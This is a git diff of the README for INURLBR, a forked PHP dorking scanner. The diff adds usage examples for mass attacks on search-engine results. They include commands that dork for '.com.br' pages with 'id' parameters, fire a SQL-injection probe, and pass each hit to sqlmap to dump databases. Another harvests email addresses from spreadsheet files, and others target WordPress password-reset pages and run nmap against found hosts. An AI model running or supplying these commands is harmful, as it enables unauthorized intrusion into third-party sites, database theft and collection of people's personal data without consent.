@@ -1,4 +1,9 @@
-# SCANNER - INURLBR
+
+
+<p style="text-align:center">
+<img src="https://lh3.googleusercontent.com/-uB97QnHQ-VY/YGYWDRmUK0I/AAAAAAAAAsI/f3BH8Kv8kvMvlrulgsbtkRsAbgHpB3mKACLcBGAsYHQ/logo2.png" width="70%"/><p>
+
+
 > **This is a fork of the original [project](https://github.com/googleinurl/SCANNER-INURLBR).**
 >
 >Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.
@@ -13,30 +18,55 @@ that any damage (dataloss, system crash, system compromise, etc.) caused by the 
 programs is not MrCl0wnLab's responsibility.
 ```
 
-```
-    Autor:    MrCl0wn
-    Blog:     https://blog.mrcl0wn.com
-    GitHub:   https://github.com/MrCl0wnLab
-    Twitter:  https://twitter.com/MrCl0wnLab
-    Email:    mrcl0wnlab\@\gmail.com
-
-    * Cybersecurity researcher specialized in GED ( Gambiarra, Exploit and Development )
-    * Script:   INURLBR
-    * Codename: Facada
-    * Version:  3.0.0
+```properties
+Autor:    MrCl0wn
+Blog:     https://blog.mrcl0wn.com
+GitHub:   https://github.com/MrCl0wnLab
+Twitter:  https://twitter.com/MrCl0wnLab
+Email:    mrcl0wnlab\@\gmail.co
+Script:   INURLBR
+Codename: Facada
+Version:  3.0.0
 ```
 
-## Screenshot
-![Screenshot](https://1.bp.blogspot.com/-oAWYXFohNpw/YGN2Lj8VUlI/AAAAAAAAArk/Xibi752EVPMQTjQbZtrasm7aJGEyH0BmwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-03-30%2B16-01-33.png)
-![Screenshot](http://4.bp.blogspot.com/-XAohC-ga9EM/VWU1l3a3QcI/AAAAAAAAA_o/BRg0mIllOgQ/s1600/sqlmap.png)
-![Screenshot](http://4.bp.blogspot.com/-bOOilZLyUFg/VWQCdHKCAwI/AAAAAAAAA_U/JAy1ChdQJU0/s1600/post.png)
-![Screenshot](http://2.bp.blogspot.com/-kCYgptMhfts/VWU2eTTTKFI/AAAAAAAAA_w/eGSt7qg4HRo/s1600/exploits.png)
+## Screenshots
+![Screenshot](https://1.bp.blogspot.com/-WswyqXamP44/YGYofFT6siI/AAAAAAAAAso/ea-3nf6OEqQxMw-dpEuIKedzwT7B5d0rwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-08-08.png)
+### Email extraction
+```bash
+php inurlbr.php  --dork '"com.br" contato  .xlsx' -m  -s emails.txt -q all
+```
+![Screenshot](https://1.bp.blogspot.com/-K_7F9nngSDk/YGYn30s1SHI/AAAAAAAAAsg/4k9NrPpBrognZ6kjx0WqeZo591X3nCydwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-01-03.png)
+
+### External Command
+```bash
+php inurlbr.php --dork '"com.br" index.php?id id' -s sqlmap.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap-dev/sqlmap.py -u "_TARGETFULL_" --dbs --batch --threads 10 -p id --random-agent'
+```
+![Screenshot](https://1.bp.blogspot.com/-dz8I8p2Aies/YGYr_yZ8x3I/AAAAAAAAAsw/cHq4KS8E6AwK7l66EsykqFgvWyXjtJqVACLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-18-39.png)
+
+### Filter Result Value
+```bash
+php inurlbr.php --dork '"com.br/wp-login.php"' -t 2  -a 'wp-login.php?action=lostpassword' -s filter_string.txt
+```
+![Screenshot](https://1.bp.blogspot.com/-vzZbwf_KobA/YGY8KQJCJwI/AAAAAAAAAs4/6jt1cse_4Goz3pfNeB1un4tmhRkKfnkVgCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B18-31-58.png)
+
+### Simple fuzz 
+```bash
+php inurlbr.php --target 'https://YOUR_TARGET' -o fuzz.txt -s php_result.txt -t 2 -a 'phpMyAdmin 2.11.4'
+```
+![Screenshot](https://1.bp.blogspot.com/-bajxhdjFMbI/YGZaj1Cj9MI/AAAAAAAAAtA/Z3trH2lq3mEPcwtfoekdS7OanLfDrcZhQCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B20-41-09.png)
+
+### Parallel terminal ( popup )
+```bash
+php inurlbr.php --target 'https://YOUR_TARGET' -o fuzz.txt -s popup_result.txt -t 2 -a 'phpMyAdmin 2.11.4' --command-vul "nmap -sV -v  _TARGET_ ;"  --popup 
+```
+![Screenshot](https://1.bp.blogspot.com/-AFOmlAmYzUg/YGZgaNOY2II/AAAAAAAAAtI/twy2icF7kTo6N2YPKzOQojptIZYTCmbywCLcBGAsYHQ/s2057/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B21-05-40.png)
+
 ## Lib & Permission
-```log
+```properties
  ----------------------------------------------------------
 PHP Version         7.4.16
-php5-curl           LIB
-php5-cli            LIB   
+php5 curl           LIB
+php5 cli            LIB   
 cURL support        enabled
 cURL Information    7.24.0
 allow_url_fopen     On
@@ -53,7 +83,7 @@ Proxy random        TOR
 resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 ```
 ## Help
-```
+```properties
 -h
 --help   Alternative long length help command.
 --ajuda  Command to specify Help.
@@ -484,8 +514,7 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 
 
 ## Commands
-------
-```bash
+```properties
 ./inurlbr.php --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
    
 ./inurlbr.php --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
@@ -549,15 +578,15 @@ resume: apt-get install curl libcurl3 libcurl3-dev php7 php7-cli php7-curl
 
 ## Installation
 Preferably, you can download inurlbr by cloning the [Git](https://github.com/MrCl0wnLab/SCANNER-INURLBR) repository:
-```bash
+```properties
 git clone https://github.com/MrCl0wnLab/SCANNER-INURLBR.git inurlbr
 ```
 The inurlbr works with [php](http://php.net/downloads.php) version **7.x**  linux platforms.
 
 ## Giving permission to script execution
-```bash
+```properties
 $chmod +x inurlbr.php
-Executar: ./inurlbr.php
+Run: ./inurlbr.php
 ```
 
 ## Setting your token ipinfo
@@ -565,19 +594,25 @@ It is possible to register more than one token
 ```bash
 ./resources/token.ipinfo.inurl
 ```
-## Setting your token ipinfo
+## Setting your strings
 You can register more validation strings
 ```bash
 ./resources/strings.validation.inurl
 ```
 
+## Setting your filter strings
+You can register more filter values that dirty your results
+```bash
+./resources/trash_list.validation.inurl
+```
+
 ## Usage
 To get a list of basic options and switches use:
-```bash
+```properties
 php inurlbr.php -h
 ```
 To get a list of all options and switches use:
-```bash
+```properties
 php inurlbr.php --help
 php inurlbr.php --info
 ```
